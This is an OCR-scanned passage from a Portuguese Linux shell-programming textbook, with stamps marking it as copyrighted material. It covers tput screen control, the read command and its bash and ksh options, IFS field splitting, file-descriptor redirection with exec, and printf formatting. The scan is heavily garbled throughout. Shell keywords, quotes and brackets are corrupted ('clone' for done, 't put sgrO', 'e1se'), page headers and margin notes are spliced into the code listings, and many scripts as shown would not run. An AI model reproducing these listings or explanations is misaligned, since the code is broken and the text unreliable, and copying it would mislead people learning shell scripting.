disse que se você colocar o terminal em modo de ênfase 1 tput bold) . essas 
cores geram outras oito. Vamos montar então a tabela definitiva de cores: 
Valor 
Cor 
Cor após tput bold 
o 
Preto 
Cinza esetJro 
1 
Vermelho 
Vermelho claro 
2 
Verde 
Verde claro 
3 
Marron 
Amarelo 
4 
A:zut 
Roxo 
5 
Púrpura 
Rosa 
6 
Clano 
Clano claro 
7 
Cinza claro 
Branco 
1 Qrl 
Aprendendo a ler 
225 
A seguir um script que serve para especificar o par de cores (da letra e 
do fundo). Veja: 
$ cat mudacor.sh 
11 1 /bin/bash 
t put sgrO 
ele a r 
# Carregando as 8 cores basicas para o vetor Cores 
Cores=(P.reto Vermel ho VeJ;de Marrom Azul Púrpura Ciano "Cinza cla r o" ) 
# Listando o menu de cores 
e c ho ,, 
Op c 
Cor 
===li 
fo r ((i=l; i <=$ (#Cores[@] ) ; i ++)) 
printf " %02d 
l s \n'' Si " $ (Cor es[i-l]} " 
) 
CL= 
unti l [ [ $CL == O[ l -8 ] 11 $CL--
[ 1-8]]] 
do 
read - p " 
Escolha a cor da letra : " CL 
clone 
# 
Para quem t em bash a po.rtir da ver.sao 3 . 2 
#+ o ce.st do until acima poderia ser f e ito 
#+ usando- s e Expressoes Regulares . Veja como : 
#+ until [[ $CL =~ 0 ? [ 1- 8) ]) 
ff+ d o 
#+ 
read - p " 
#+ Escol ha a cor d a let.ra : " CL 
#+ done 
CF= 
until [ [ $CF== O[ l -8] 11 $CF== [ 1-8]]] 
do 
read -p '' 
Escolha a cor de fundo : " CF 
done 
let CL-- ; l et CF--
tput setaf $CL 
t put s et.ab $CF 
clear 
# A cor pret.a eh zer o e nao um 
Material com direitos autorais 
226 Programação SheU Linux 
Exemplo: 
S ca.t tputcup 
clea.r 
~put cup 3 6 
echo ".<-" 
~pu~ cup 2 10 
echo ''I., 
t.put cup 1 12 
~cho " / " 
tput c up O H 
ec ho " 
Este eh o ponto (3, 6 )" 
----
Executando vem: 
$ tputcup 
---- Este eh o ponto (3, 6) 
S 
I 
I 
.<-
Note que no exemplo citado, propositadamente, a tela foi formatada de 
baixo para cima, isto é, da linha três para a zero. Isso explica a presença do 
prompt <SJ na linha um, já que quando acabou a execução do programa, 
o cursor estava na linha zero. 
Por curiosidade, vamos tirar a instrução clear da primeira linha, em se-
guida vamos listar o programa e executá-lo. A seguir está a tela resultante 
desses passos: 
$ cat tputcup _____ Este eh o ponto (3, 6) 
S ut:. c up 3 6/ 
~cho ". <- ''I 
~:pu~: cup . <- 10 
ec ho " / .. 
~pu~ cup l 12 
echo •• /" 
~:put cup O 14 
acho "---- Este a h o pot>to (3, 6) • 
$ tputcup 
Copyr ht 
Aprendendo a ler 
227 
Nessa bagunça, vimos que a execução do programa foi feita por cima 
de sua listagem e, conforme dá para perceber, se não usarmos o cl ear no 
início do programa que trabalha com tput c up, sua tela formatada normal-
mente fica comprometida. 
Já que as outras formas de tput envolvem somente atributos de tela, 
fica difícil, em uma publicação, apresentar exemplos que ilustrem seus 
usos. Podemos, no entanto, digitar para efeito de teste, uma rotina que 
faça crítica de sexo. Façamos assim: 
$ cat > t e s t s e x 
c l ear 
s e xo=$1 
if 
[ "$sex o 11 
- l t 1 - o " ( 11 
1' $sexo" -gt 2 ")"
] 
t he n 
f i 
t put cup 21 20 
tput smso 
e cho "Estas em duvi da , 
s l eep 5 
t p u t sgr O 
tpu t r eset 
e xit 1 
tpu t bolà 
tpu t cup 10 35 
i f 
[ " $sexo " -eq 1 ] 
t he n 
e c ho s e xo mascul i no 
e1se 
echo sexo f eminino 
fi 
s l eep 5 
tpu t sgr O 
tput r e set 
e xit 
<'O> 
Vamos testá-lo assim: 
$ t e stse x 1 
$ t estsex 2 
$ testsex 5 
e ' ? ? ? " 
Vai para linha 21 coluna 20 
Coloca temlinal em vídeo reverso 
Espera 5 segundos para ler mensagem de erro 
Restaura o modo normal do tennina/ 
Retoma tudo ao original e dá um clear 
Coloca terminal em modo de realce 
Vai para linha 10 coluna 35 
Material com direitos autorais 
228 Programação SheU Linux 
Afinal como é que se lê? 
Com o comando read, é claro. Você pode ler dados de arquivos ou direta-
mente do teclado com esta instrução. Sua sintaxe geral é: 
read [var,J (var. ) . . . fv<>t..J 
Onde var,, var: , 
. . . var. são variáveis separadas por um ou mais 
espaços em branco ou <'rAB> e os valores informados também deverão 
conter um ou mais espaços entre si. 
Exemplo: 
$ read a b c 
aaaaa bbbbbb ccccccc 
$ echo - e •$a\n$b\n$c" " 
aaaaa 
bbbbbb 
ceccccc 
S r ead a b 
""""" bbbbbb ccccccc 
$ echo - e • $a\n$b"" 
aaaaa 
bbbbbb ccccccc 
Cadelas de carederes seperadas por espaço 
0\n significa new-line.A opção -e só é valida no LINUX 
A v~riilvel $a recebe 11 t• porção 
A vitiÍável Sb recebe o resto da cadeia 
Vamos ver agora um trecho de programa que critica uma matricula re-
cebida pelo teclado. Caso este campo esteja vazio, daremos oportunidade 
ao operador para descontinuar o programa. Caso não seja numérico, será 
dado um aviso de que o campo digitado está incorreto, pedindo a sua re-
digitação: 
$ cat tstmatr 
while true 
do 
e l e a t: 
tput cup 10 15 
Só sai do loop se encontrar um break 
echo -n "Ent re com s ua mat:..ricula : •• 
read ~latric 
15. A opção-e ê necessária somente em ambiente LINUX. Nos outros sabores de UNIX esta opção 
não deve ser usada. 
Copyr ht 
if ( ! "$Matric" J 
t:hen 
tput cup 12 15 
Aprendendo a ler 
229 
Se a variável Matric estiver vazia ... 
echo - n " Deseja abandonar? (N/s ) " 
ON, por estar maiúsculo, é o defau/1 
read s n 
fi 
i f ( "$sn" = S - o '' { '' f'$sn" = s '') '' ] 
then 
exit 
fi 
c ont inue 
if expr $Matr i c + 1 1> /dev/null 2>&1 
then 
break 
el se 
tput cup 12 15 
Testo se és em caixa aha ou caixa baixa 
Despreza o result. e possível erro 
e cho - n "Iofatricula Nao Numerica . Tec l e < ENTER> p/ continuar . . . " 
read 
conti nue 
fi 
done 
Caso o separador entre os campos não seja um espaço em 
branco (o que é muito comum nos arquivos do UNIX/LINUX), 
basta trocarmos a variável IFS conforme vimos no Capitulo 
5. Observe o exemplo a seguir: 
~ grep julio /etc/passwd 
O registro estava da forma seguinte 
julio: x: 60009 : 1022 : Testa aplic,1ti vo.s: /prdl /usr/julío: /usr/bin/ ksh 
~ oldiFS= " ~ IFS" 
Salvei o IFS. 
~ IFS=: 
Fiz o novo /FS valer: como em letc/passwd 
$ grep julio / etc/passwd I read l name nada uid gid coment hdir shini 
$ echo - e" 
" ~lname\n$uid\n$gid\n~coment\ n$hdir\n$ shini " 
julio 
60009 
1022 
Te.s ta aplicativos 
/prdl/ usr/ julio 
/usr/bin / ksh 
$ I FS=" $Oldi FS" 
Este é o login name 
Este é o User ld 
O Groupld 
Os comentários 
O Home Dírectory 
O She/1 inicial 
Restauro o IFS, voltando tudo à normalidade 
16. Como já foi citado antes, a opção -e só deve ser usada sob o bash. 
Material com direitos autorais 
230 Programação SheU Linux 
Outra forma legal de usar o here string é casando-o com um comando 
read, não perdendo de vista o que aprendemos sobre r fS . O comando 
cat com as opções - vet mostra o <ENTF;R> como $ , o <TAB> como " I e 
os outros caracteres de controle com a notação " L, onde L é uma letra 
qualquer. Vejamos então o conteúdo de uma variável e depois vamos ler 
cada um de seus campos: 
$ eoho "$Linha" 
Leonardo Nello 
(21)3313-1329 
$ ca.c - vet <<< "$Linha " 
Leonardo ~!ello" I !21) 3313-1329$ 
$ read Nom SNom 'l'el <<< "$Linha" 
S echo "${Norn) _${SNomi _STe1" 
Leona r elo _~!ello _ (21) 33l3- i329 
Separadotes btanco e <TAB> ("I) 
Vamos vet se ele leu cada um dos campos 
Leu porque separadores casavam com o IFS 
Primeiramente vamos listar um pedaço do Arqopers , para que possa-
mos conhecer o seu fayout. Vamos fazer isso listando os quatro primeiros 
(head - 4l dos dezesseis últimos (tail - 161 registros do arquivo: 
$ tai1 -16 Arqopers 
head - 4 
13 
dupbgpO l 
14 
duprtlO l 
lS 
clupedbOl 
16 
dupi s,Q l 
ttan it1 tdani e l 3Cl!\anucl 
areva itarouco oalves 
alyra lribeiro mrnelo hmelo lealobo 
j roherto cgercin• 
No pedaço de arquivo anterior, notamos que o primeiro campo é o nú-
• 
mero do Orgão Local (chamado de OL), o segundo, o nome da máquina e 
o terceiro, os operadores que receberão e-maif quando for disponibilizado 
algum arquivo para o seu OL. Finalmente, devemos observar que o 12 cam-
po está separado do 22 por uma <TAB>, assim como o 22 do 32. 
A seguir, a simplificação da rotina que envia e-mail para os operadores: 
cat i\rqOpers I 
>thile read OL l1aq Opers 
do 
for Oper i n SOpers 
do 
mail " SOper~SHaq " « 
E'imHail 
Ref . Transfe r encia de Arquivos 
I nformamos CfUe : 
Psssolinhs a finho psrs o whie por cause do 1 
Opets recebe do 3' csmpo em diente 
Separe cede um dos opersdotes des regionais 
Tudo ate o lebel AmMail faz p81te do com/lndo 
O procc~snm~nto d~ ' dat~ ' +~d/ ,b/ ~ y \ ' ns ~ R Hr ' ' disponibilizou o nrqui vo 
· ccho "$Al:q" . Z · no seu diretori o de saida (lprd4/staout/$Site) do ' w1ame -n · 
Copyr ht 
Aprendendo a ler 
231 
Lembramos que a politica d e backup nao incl ui arquivos t ransit o.rios 
como 
o c i t ado ac i ma . E' portant o funda-ment al a p re ste za em capt ura- l o para sua 
filial, o q ue pode ser f e i ·to u t i l izando 
o p r ograma 
p egapack . sh , que 
es1:a disponi vel no diretor io / dsv/ ftp / pub de durj cvOl. 
saudacoes . 
Fiml1ail 
done 
clone 
Uma outra forma de ler dados de um arquivo é montar um bloco de pro-
grama que faça leitura e redirecionar a entrada primária para o arquivo que 
se deseja ler. Assim: 
I•Thil e read Li nha 
do 
OL= ' echo "$Li nha'' I cut - fl ~ 
Arq='echo "$Linha " I cut - f2' 
Opers= · echo "$Linh a'' I c ut 
-f 3
~ 
clone < Ar qOpers 
Todo cuidado é pouco quando, dentro de um ciclo de leitura de 
um arquivo, você desejar ler um dado oriundo da tela, como 
por exemplo: esperar que a tecla <ENTER> seja acionada, de-
monstrando que uma determinada mensagem que você man-
dou para a tela já foi lida. Nesse caso, a única forma de fazer 
isso, que conheço, é redirecionando a entrada para /devltty 
que é o terminal corrente. Se esse redirecionamento não for 
feitO, 0 nOVO r ead (nO C8S0 esperandO 0 <ENTER>) nãO lerá dO 
teclado, mas sim do arquivo especificado no loop de leitura. 
Isso está muito enrolado, vamos ver um exemplo para clarear: 
~ cat l t 
# 
# 
Lista o con t e ud o do arquivo d e t e l efones 
# 
Cont aLinha=O 
cl ear 
Variilvel para fazer quebra de página. 
echo " 
Material com direitos autorais 
232 Programação SheU Linux 
Nome 
" 
cat telefones 1 
>~hile read Linha 
do 
if 
[ $ContaLinha -9e 21 I 
th<!n 
tput cup 2<1 28 
Telefone 
Se ContaUnha :<: 21 quebra a página. 
echo -n "Tecle <ENI'ER> 
read a < /dev/tt y 
para pro~~eguir ou X para ter~nar .. . " 
Redirecionando ll leitura PMil o tecllldo. 
" 
clone 
fi 
íf 
[ "$a" ; X ) 
then 
e:üt 
fi 
cleax: 
echo lf 
Nome 
ContaLinha;O 
echo " 
$Linha" 
Telefone 
ContaLinha-· expr $ContaLinha + 1" 
tpuc cup 24 49 
Se operador teclou X. tcnnine programa. 
echo - e "Técl e <ENTE R> para t.erminar ... \c" 
read a 
clear 
exit 
Esta fora do loop. Não redfrecionel teiiura. 
Quando eu fiz read a da primeira vez, estava dentro de um loop de lei-
tura do arquivo telefones e então se não tivesse redirecionado a entrada, 
o conteúdo do próximo registro de telefones teria ido para a variável sa. 
Da segunda vez, por já ter saído do loop de leitura, não foi necessário fazer 
o redirecionamento. 
Outro tipo de programa que o read nos permite fazer é um menu orien-
tado ao sistema que estamos desenvolvendo. Como exemplo, retoma-
remos aos nossos programas que tratam o arquivo telefones , que são: 
add, pp, rem e 1t . Vamos reuni-los em um único programa que chama-
remos de teles e que será responsável pelo controle da execução dos 
mesmos. 
Copyr ht 
$ c at tel e s 
# 
Aprendendo a ler 
233 
# 
T~enu do cadastro de tel efones 
# 
echo - n " 
read Opcao 
Opcao 
---·-·-
-----
1 
2 
3 
4 
A opção -n setVe pera não saltar linha ao final do echo. 
Acao 
-~· --
----
Procur ar Alguem 
Adic i ona r .>üguem ao Cadexno de Tel efones 
Remover Al guem do Cadastro de Telefones 
Lis tagem d o Ca de.rno de Te lefones 
Escolha Uma Das Opcoes ·"-cima (1-4) : " 
ec ho -e " \ n " # O \n quando prot e gid o do She l l c ausa um sal to de l i nha 
case u$0pcao" 
in 
1) echo - e " 
Entre cotn o nome a pesquisar : \n" 
r ead Nome 
pp "$Nome" 
' ' 
2) echo - e " 
Nome a ser adi cionado : \n" 
read Nome 
echo - e " 
Telefone de $Nome : \n
11 
read Tel e f 
add '' $Nome n 
" $Telef " 
' ' 
3 ) echo - e " 
Nome a ser r emov i do : \ n " 
r ead Nome 
rem " $Nome '' 
' ' 
4) lt 
' ' 
• ) echo "Sob sao validas opcoes entre 1 e 4'' 
exit l 
' ' 
esac 
exit 
Um simples comando echo é usado para mostrar todo o menu no ter-
minal, tirando proveito das aspas para preservarem os caracteres new fine 
(\01 O) presentes no texto. O comando read é usado para armazenar na 
variável opcao a escolha do usuário. 
Material com direitos autorais 
234 Programação SheU Linux 
Um case é então executado para definir que rumo tomar com a escolha. 
Um simples asterisco c·>, representando nenhuma das escolhas anterio-
res, serve como crítica ao conteúdo da variável Opcao . 
Vejamos a sua execução: 
S teles 
Opcao 
Acao 
-----
----
-----
----
l 
Procurar Alguem 
2 
Adicionar Alguem ao Caderno ele Telefones 
3 
Remover }>.lguem do Cadastro de Telefones 
4 
Listagem do Cade rno de Tclefone3 
Escolha Urna Das Opcoes Acima ( 1-4) : 2 
Nome a ser adicionado: J'Ul ian.a Duarte 
Telefone de Juliana oua ne : 
(024) 622-2876 
Temos duas maneiras de ver se tudo correu bem: verificando pelo nome 
da Juliana ou fazendo a listagem geral. Vejamos as duas execuções: 
$ teles 
Opcao 
Acao 
-----
----
-----
----
1 
Procurar Al guem 
2 
Adiciol\11!: A.lguem ao Cadérno dê Télefones 
3 
Remover Alguern do Cadastro de Telefones 
1 
Listagem do Caderno de Telefones 
Escolha Urna Das Opcoes Acima (1- 4) : l 
Entre com o nome a pesquisar: J'Uliana 
Juliana Duarte (0241 622- 2616 
Já no segundo caso, após chamarmos teles e fazermos a opção 
~ teremos: 
Nome 
C i 1:0 Grippi 
Claudia 11o.rcill 
Enio Cardoso 
Telefone 
(021) 555-1234 
(021) 555-2112 
(021)232-3423 
Copyr ht 
Ju l iana Duart e 
Lui z 
Carlos 
N"ey Garrafas 
Ney Ge r hardt 
Paula Duart e 
(024) 62 2-2876 
(021) 767- 2124 
(02 1) 988 - 3398 
(024 ) 543- 43 2 1 
(011) 449- 0989 
Aprendendo a ler 
235 
Ç::::J Cá esta ela ... 
Tecl e <ENTER> par a terminar.,, 
Vamos executar, novamente, passando uma opção inválida: 
$ tel e s 
Opcao 
Acao 
--~--
----
-----
----
1 
Procurar Alguem 
2 
Adicionar ·""l guem ao Cad eJ:n o d e Tel efones 
3 
Remover Al 91tem do Cadastr o de Telefones 
4 
Listagem do Caderno de Te l e fones 
Escolha Uma Das Opcoes Acima ( 1- 4) : 6 
Soh sao validas opcoes ent re 1 e 4 
Nesse caso, o programa simplesmente exibe Soh sao val i das opcoes 
entre 1 e 4 e é descontinuado. Uma versão mais amigável deve continuar 
solicitando até que uma opção correta seja feita. Sempre que se fala até 
penso em unt J.l e efetivamente para que este nosso desejo aconteça, 
basta colocar todo o programa dentro de um ciclo de until que será exe-
cutado até que uma opção correta seja feita. 
A grande maioria das vezes que executarmos tel es será para con-
sultar o nome de alguém, assim, se na chamada do programa estivés-
semos passando algum parâmetro, poderíamos supor que a opção de-
sejada por default fosse a 1 e já executássemos o programa pp. Assim, 
poderíamos escrever uma nova versão do programa, com a seguinte 
cara: 
$ cat teles 
# 
# 
Nenu do c adas tro d e t elefones -
versao 2 
# 
if 
( "$#'' -ne O J 
then 
pp " $* " 
exit 
Mais que um parâmetro, executo pp 
Material com direitos autorais 
236 Programação SheU Linux 
unt.ü [ "$0K" 1 
do 
echo - n ., 
Opcao 
===== 
1 
2 
3 
4 
B:scolha 
read Opcao 
echo -e "'\n ,. 
OK=l 
case " $0pcao" 
in 
1) echo -n " 
read Nome 
pp "$Nome" 
. . 
• • 
2) echo - n " 
read Nome 
echo -n " 
read Telef 
Enquanto opção for invillída, $0K estará vazia 
i'<cao 
----
----
Procurar Alguem 
Adicionar Alguem ao Caderno de Telefones 
Remover Alguem do Cadastro de Telefones 
Listagem do Cade rno da Telefones 
Uma Das Opcoes Acima (1- 4): " 
N.é que se prove o contrário, a opção é boa 
Entre com o nome a pesquisar : " 
Nome a ser .!ldicion,ado: " 
Telefone de $Nome : " 
add "$Nome " "$Telt!f" 
esae 
clone 
exit 
• • 
3) echo - n " 
read Nome 
rê1n '"' $Nome" 
. . 
• • 
~) lt 
• • 
Nome a ser removido: " 
• ) echo "Soh sao validas opcoes entre 1 e 4" 
OK= 
Opção lncotre/B. Esvazio SOK forçando o loop 
. . 
• • 
Se a quantidade de parâmetros for diferente de zero, então o pp é 
chamado diretamente, passando os argumentos digitados na linha de co-
mando. A variável $OK foi criada para controlar o loop do until . Enquan-
to ela permanecer vazia, o programa continuará em loop. Portanto, logo 
após receber a escolha, colocamos um valor em soK (no caso coloca-
mos 1, mas poderia ser true, verdadeiro, OK, ... ) para que servisse para 
qualquer opção correta. Caso a escolha fosse indevida, então soK seria 
Copyr ht 
Aprendendo a ler 
237 
novamente esvaziada, forçando desta maneira o loop. Vejamos então seu 
comportamento: 
$ tel e s Juliana 
Juli ana Duar te (024) 622-2876 
$ tel e s 
Opcao 
Acao 
-----
----
-----
----
1 
Procurar J\lguem 
2 
Adicionar Al guern ao Caderno de Tel efones 
3 
Remover Alguem do Cadast ro de Telefone s 
4 
Li stagem do Caderno de Telefones 
Escolha Uma Das Opcoes Acima (1- 4) : 5 
Soh sao validas opcoes entre 1 e 4 
Opcao 
Acao 
-----
----
-----
----
1 
Procurar Alguem 
2 
Adicionar Al guem ao Caderno de Tel efones 
3 
Remover Alguem do Cadastro de Telefones 
4 
I.istagem do Cade.rno de Telefones 
Escolha Uma Das Opcoes Acima (1-4) : 1 
Entre com o nome a pesquisar : Ney 
Ney Garrafas 
Ney Gexhaxdt 
(021) 988-3398 
(024)543-4321 
Leitura dinâmica 
Você deve estar achando que esse negócio de, toda hora que for fazer 
uma leitura na tela, ter de executar antes um echo para escrever o literal, 
é muito chato! Mas sou obrigado a concordar. Acho que pensando nisto, 
no desenvolvimento do ksh sob UNIX, foi implementada uma variante 
do comando r ead que permite escrever um literal e, à sua frente, parar 
esperando a digitação do valor do campo. Esta implementação tem esta 
cara: 
.t.:ead <nome da variável>?<p:r:ompt > 
Onde: 
<nome da variável> é a variável que receberá o campo que for digitado; 
<pr ompt> é o literal que será escrito na tela para indicar o que deve ser 
digitado, 
Material com direitos autorais 
238 Programação SheU Linux 
Exemplo: O seguinte trecho de programa, 
tput cup 10 20 
~ead Nome?"Oigite seu nome : • 
ao ser executado, posicionaria o cursor na linha 1 O coluna 20 e escreveria: 
Digite seu nome : 
o cursor, então, ficaria parado após o espaço em branco que segue os dois 
pontos c: ) , esperando pela digitação do operador, e o conteúdo dessa 
digitação iria para a variável $Nome . 
Vejamos agora o programa teles, descrito antes, como ficaria alteran-
do as instruções read para este novo formato: 
$ cat teles 
il
! /us~/b in/ksh 
li 
i 
Menu do cadastro de telefones - versao 3 
i 
i f 
( "$H " •ne o 1 
then 
pp "'$"""' 
exit 
fi 
until r .. $0K" I 
do 
read Opcao? " 
ec:.ho ., \n " 
OK•l 
Opcao 
Acao 
1 
Procurar Alguem 
2 
Adicionar hlguem &o Caderno de Tel efones 
3 
Remover Alguem do Cadastro de Telefones 
4 
Listagem do Cade ~no de Telefones 
Escolha Uma Das Opcoes Acima (1-4) : " 
case "$0pcao" 
in 
1) read Nome?" 
pp "'$Nome! " 
. . 
' ' 
2) read Nome?" 
Entre com o nome a pesquisar: • 
Nome a ser adicionado: " 
Copyr ht 
dono 
exit:. 
esac 
read ·relef?" 
add t'.$Nomc" "$Telef" 
• • 
3) read Nome?" 
re.m 
~· $Nome" 
. . . ' 
4) lt 
• • 
Telefone de $Nome : " 
Nome a .se.r l:emovido: •· 
.a.") ech o "Soh s.ao velida~ opcoe!l entre 1 e 4 " 
OK= 
. . . ' 
Aprendendo a ler 
239 
Viu que legal? O programa deu uma boa encolhida! Porém é fundamen-
tal ficarmos atentos no uso desse formato, porque só poderemos usá-lo 
caso tenhamos certeza absoluta de que ele será sempre executado em 
ambiente do ksh sob o Sistema Operacional UNIX. 
Leitura sob o Bash 
Da mesma maneira que a seção anterior mostra uma forma de leitura típica 
do ksh, esta seção mostrará algumas implementações do comando read 
que só podem ser usadas sob o Bash. 
Opção -p 
O que acabamos de ver, Leitura Dinâmica, isto é, um comando de leitura que 
englobasse o prompt, pode ser feito em Bash com a opção -p prompt. 
Exemplo: 
$ read -p •oigite sua Matricula: " Matric 
Di git:.e .::Jua Matricula : 123156 
$ echo $Matric 
123156 
Opção -t 
O comando read acompanhado da opção - t tempo causa o término da 
instrução após o decurso de t empo segundos. Caso o comando termine 
pelo "estouro" de tempo. ela retornará um código de erro (s? diferente de 
zero). 
Copyr ht 
240 Programação SheU Linux 
Exemplo: 
S read - t 2 -p "Digite seu nome: " Nome li 
> acho - e "\nDigite tnais rapido na prox.irna vez" 
Di git<': s eu norn<': : 
Di gite mai s rapido na proxima vez 
No exemplo, dei somente dois segundos para o operador digitar o seu 
nome, como obviamente ele não conseguiu, o comando read terminou 
com um erro e por isso foi executada a instrução echo que o seguia. 
Um bom uso desta opção é para provocar uma saída por tl.meou t de 
aplicativos. 
Opção -n 
Quando usamos o comando read com a opção -n num, estamos dizendo 
que a execução da instrução terminará com um <E:NTER> ou após serem 
digitados num caracteres, o que ocorrer primeiro. 
Exemplo: 
Sabemos que um CEP é formado por 5 algarismos, um traço e mais 
três algarismos. Então poderíamos fazer a sua leitura da seguinte ma-
netra: 
$ read -n 5 -p "Digite o CEP: " Cep; ;read -n 3 - p "-" Compl 
Di gite o CEP: 12345- 123 
$ echo $Cep 
12345 
$ echo $Compl 
123 
Quando o comando read -n nu m não termina por um <ENTE R> , o 
cursor não passa para a linha seguinte, permitindo-nos esse tipo de 
construção. Observe que coloquei todos os comandos na mesma linha 
para não ter que criar um script só para o exemplo, isto é, caso as leitu-
ras acima estivessem dentro de um script, poderia colocá-las em linhas 
distintas, suprimindo (caso desejasse) o ponto e vfrgula, melhorando a 
legibilidade. 
Copyr ht 
Aprendendo a ler 
241 
Opção -s 
O comando read com a opção - s (derivado de silent} exerce a mesma 
função que se houvesse um stty - echo antes do .react (conforme está 
explicado no início deste mesmo capítulo}, isto é, tudo que for teclado 
até o fim da instrução não aparecerá na tela. Obviamente esta é a 
construção indicada para capturarmos senha pela tela (somente sob o 
Bash, não esqueça). 
Opção -a 
O Bash permite uma leitura direta para um vetor ou array, e isso se faz com 
auxílio da opção - a do comando r ead. 
Veremos os exemplos do uso dessa opção no capítulo 7, na seção em 
que aprenderemos a lidar com os vetores. 
Outra forma de ler e gravar em arquivos 
Os comandos esperam que três descritores de arquivo (file descriptors ou 
fd) estejam disponíveis. O primeiro, fd o (entrada padrão ou stdin), é para 
leitura. Os outros dois ( fd 1 - saída padrão ou stdout e fd 2 - saída de 
erro padrão ou stderr) são para escrita. 
Existe sempre um stdin, stdout, e um stderr associado a cada comando. 
ls 2>&1 significa uma conexão temporária da saída de erro do ls com o 
mesmo "recurso" do stdout deste She/1. 
Por convenção, um programa recebe os dados pelo fd o (sldin), man-
da a saída normal para o fel 1 (stdout) e a saída de erro para o t d 2 
(stderr) . Se um desses três f ds não estiver aberto, você deve encontrar 
problemas. 
Quando o xterm começa, antes de executar o She/1 do usuário, o xterm 
abre o device de terminal (!dev/pts/ n ) três vezes. Nesse ponto, o Shell 
herda três descritores de arquivo, e cada comando (processo filho) que é 
executado pelo She// herda-os por sua vez, exceto quando esse comando 
é redirecionado. 
Material com direitos autorais 
Z4Z 
Programação Shell Linux 
Redirecionamento significa reassociar um dos descritores de arquivo a 
outro arquivo (ou a um pipe, ou qualquf.!r coisa permissível). Descritores de 
arquivo podem ser reassociados localmente (para um comando, um grupo 
de comandos, um subshell, ... ) ou globalmente, para o resto do She/1 usan-
do o comando exec . 
Os principais usos dos descritores de arquivo constam na tabela a se-
guir. Vale observar que o que vale para os redirecionamentos de entrada 
serve também para os de saída. 
Utilização _ ___ 
Ação 
~Arqutvo 
Redireciona o stdout e stderr para Arquivo 
=~~=--
j<>Arqu'ivo 
Redireciona o descrilor i para j Todas saldas do 
arquivo apontado por i são enviadas para o ar· 
nooiun 
~ . 'por j 
Redireciona a stdout para j . Todas as saídas 
para stdout irão para o arquivo apontado por j 
Abre o arquivo Arquivo para leitura e gravação, e 
associa a ele o descritor j 
Fecha o arquivo associado ao descritor j 
Vejamos agora um exemplo envolvendo os dados dessa tabela: 
$ echo 1234567990 > Arqui vo 
$ exec 3<> Arquivo 
$ read - n 4 <&3 
$ echo -n . >&3 
$ exec 3>&-
$ cat. Arquivo 
123q , 67890 
Grava a cadeia em Arquivo 
Abre Arquivo como VO e associa o fd 3 a ele 
L é somente 4 caracteres 
Então coloca um ponto decimal 
Fecha o fd 3 como veremos a seguir 
Na sequência acima, devemos reparar que o primeiro redireciona-
mento durou somente o tempo suficiente para a execução da instrução 
à qual ele estava ligado !echo) ser executada e foi isso que vimos ao 
longo deste livro até agora. Para tomar definitiva a associação do td 3 
ao Arquivo foi necessário usar o comando exec e, assim sendo, foi 
necessário, ao final dessa série, executar outro exec para fazer essa 
dissociação. 
Aprendendo a ler 
243 
O uso do comando exec acarreta isso porque ele substitui o She/1 que 
lhe está assistindo sem criar processo adicional, e este ambiente gerado 
herda os redirecionamentos. 
Veja também este outro exemplo para redirecionar somente a stderr 
. 
para um ptpe: 
exec 3>& 1 
ls - 1 2> &1 > &3 3> &-
1 grep bact 3 >&-
exec 3>&-
Salvou o "Valor co.rrente do stdout 
Fecha fd 3 (stdout) para o grep mas não para o ls 
Agora fechou para o resto do scripl 
Mais um exemplo, com um fragmento de script vergonhosamente copia-
do de http://www.thobias.org/bin/visitas.txt. : -> 
# l ink de fd 6 com a s t dout e redi reci ona a .stdout para um a rqui vo . 
# a part ir daqui toda a stctout vai para $temp_ htntl 
exec 6> &.1 : e><ec > $t:emp_ html 
Resumindo: evito sempre que possível essa sintaxe porque essa for-
ma de programar é meio complicada e, para futuras manutenções, tem a 
legibilidade não muito amigável, porém ela quebra o maior galho quando 
a definição do programa que você está fazendo o obriga a trabalhar com 
diversos arquivos abertos simultaneamente. 
Já sei ler. Será que sei escrever? 
Ufa! Agora você já sabe tudo sobre leitura, mas sobre escrita está apenas 
engatinhando. Já sei que você vai me perguntar: 
Ora, não é com o comando ech o e com os redirecionamentos de 
saída que se escreve? 
É, com esses comandos você escreve 90% das coisas necessárias, po-
rém se precisar escrever algo formatado eles lhe darão muito trabalho. 
Para formatar a saída veremos agora uma instrução muito interessante- é 
o print f - sua sintaxe é a seguinte: 
pri ntf f o r mato [argume nto .. . ] 
Material com direitos autorais 
244 Programação Shell Linux 
Onde: 
formo to 
-
é uma cadeia de caracteres que contém 3 tipos de objeto: 
1 -
caracteres simples; 2 -
caracteres para especificação 
de formato e 3 -
sequência de escape no padrão da 
linguagem C. 
Argumento -
é a cadeia a ser impressa sob o controle do formato. 
Cada um dos caracteres utilizados para especificação de forma t o é 
precedido pelo caractere % e logo a seguir vem a especificação de forma t o 
de acordo com a tabela: 
....JLetra 
A expressão será Impressa como: 
c 
e 
f 
o 
o 
s 
X 
Simples caractere 
Número no slstema decimal 
Notação científlc;a exponencial 
Número com ponto decimal17 
O menor entre os formatos k e %f com supressão dos ~~·w 
não significativos 
Número no sistema octal 
Cadela de caracteres 
Número no slstema hexadecimal 
Imprime um %. Não existe nenhuma conversão 
As sequências de escape padrão da linguagem C são sempre precedidas 
por uma contra barra (\) e as reconhecidas pelo comando pr inL f são: 
-..1 Sequéncia 
Efeito 
a 
Soaobeep 
b 
Volta uma 
F 
Salta para a próxima página lógica (form feed) 
n 
o Inicio da linha 
"""""""""'r...., 
Volta para o inicio da linha corrente (carriage rotum) 
Não acabou por aí, não! Tem muito mais coisa sobre a instrução, mas 
como é muito cheio de detalhes e, portanto, chato para explicar, e pior ain-
da para ler ou estudar, vamos passar direto aos exemplos, que não estou 
aqui para encher o saco de ninguém. 
17. Nllo consegui fazer esse formato funcionar sob o SVR4; no Linux funciona beleza 
1 Qrl 
Exemplo: 
$ printf "%c '' "1 caractern 
1$ 
$ pri ntf 
"%c \ n" "1 caracter" 
1 
$ pri n tf 
11 %-c caracte re\ n'' 1 
1 caractere 
$ a=2 
$ printf "%c caracteres\n" $a 
2 caractere.s 
$ printf "%10c caracteres\n " $a 
2 c a.ract e.res 
$ printf " %10c \n" $a caracteres 
2 
c 
Aprendendo a ler 
245 
Errado! Só listou 1 cl1ar e não saltou linha ao final 
Saltou linha mas ainda não listou a cadeia inteira 
Esta é a forma correta o %c recebeu o 1 
O %c recebeu o valor da variável $a 
Repare que, nos dois últimos exemplos, em virtude do %c, só foi lista-
do um caractere de cada cadeia. O 10 à frente do "c " não significa 10 
caracteres. Um número seguindo o sinal de percentagem í %) significa o 
tamanho que a cadeia terá após a execução do comando. 
$ printf " 'iSd\n" 32 
32 
$ printf 1' %10d\n" 32 
32 
$ printf " %04d\n" 32 
0032 
Preenche com brancos á esquerda e não com zeros 
04 após %significa 4 dígitos com zeros a esquerda 
